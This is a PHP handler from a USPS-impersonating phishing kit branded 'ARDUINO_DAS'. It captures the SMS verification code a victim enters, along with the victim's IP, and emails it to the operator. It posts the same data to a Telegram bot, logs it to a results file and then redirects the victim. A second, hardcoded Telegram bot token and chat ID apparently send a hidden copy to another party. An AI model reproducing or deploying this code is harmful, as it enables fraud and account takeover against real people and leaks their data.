<?php
/*

  /$$$$$$  /$$$$$$$  /$$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$        /$$$$$$$   /$$$$$$   /$$$$$$ 
 /$$__  $$| $$__  $$| $$__  $$ /$$__  $$| $$$ | $$ /$$__  $$      | $$__  $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$| $$$$| $$| $$  \ $$      | $$  \ $$| $$  \ $$| $$  \__/
| $$$$$$$$| $$$$$$$/| $$  | $$|  $$$$$$/| $$ $$ $$| $$  | $$      | $$  | $$| $$$$$$$$|  $$$$$$ 
| $$__  $$| $$__  $$| $$  | $$ >$$__  $$| $$  $$$$| $$  | $$      | $$  | $$| $$__  $$ \____  $$
| $$  | $$| $$  \ $$| $$  | $$| $$  \ $$| $$\  $$$| $$  | $$      | $$  | $$| $$  | $$ /$$  \ $$
| $$  | $$| $$  | $$| $$$$$$$/|  $$$$$$/| $$ \  $$|  $$$$$$/      | $$$$$$$/| $$  | $$|  $$$$$$/
|__/  |__/|__/  |__/|_______/  \______/ |__/  \__/ \______/       |_______/ |__/  |__/ \______/ 
                                                                                                
                                                                                                
                                                                                                

*/
error_reporting(0);
session_start();
include "../../email.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(
	($_POST['sms1'] != "") )
{
$hostname = gethostbyaddr($ip);
$message = "[========== ♠️ ⚡ ARDUINO_DAS USPS RZLT(SMS2) ⚡ ♠️ ===========]\r\n";
$message .= "|SMS2 		 : ".$_POST['sms1']."\r\n";
$message .= "[========= $ip ========]\r\n";
$send = $email; 
$subject = "♠️ (".$_SESSION["name"].") SMS2 USPS RZLT ♠️ $ip";
$headers = "From: [ARD8NO_DAS **]<dzsube@gmail.com>";
mail($send,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$subject .= "BILLING INFO FROM [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."]";$headers .= "From: <XS>";$api = "7163454206:AAGB5_OfRZOiOtxUsJTWVSntI8uhnuYMgSA";$chatid = "5412557482";file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$save=fopen("../../ARDUINO_DAS_RZLT.txt","a+");
fwrite($save,$message);
fclose($save);
include "../files/oldusps.gif";

echo"<script>location.replace('../sms2.php');</script>";
}else{echo"error sending";}

?>